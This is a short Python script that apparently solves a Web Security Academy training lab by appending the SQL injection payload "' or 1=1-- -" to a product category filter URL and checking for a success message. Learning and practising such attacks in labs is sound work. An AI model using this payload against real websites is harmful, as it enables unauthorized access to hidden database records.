
# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "https://0afb005d0353444ac1880d2e00f70024.web-security-academy.net/filter?category=Accessories"

payload = "' or 1=1-- -"

r = requests.get(url+payload, verify=False)

if "Congratulations" in r.text:
    print("[+] Successfull!")
else:
    print("[-] Unsuccessfull!")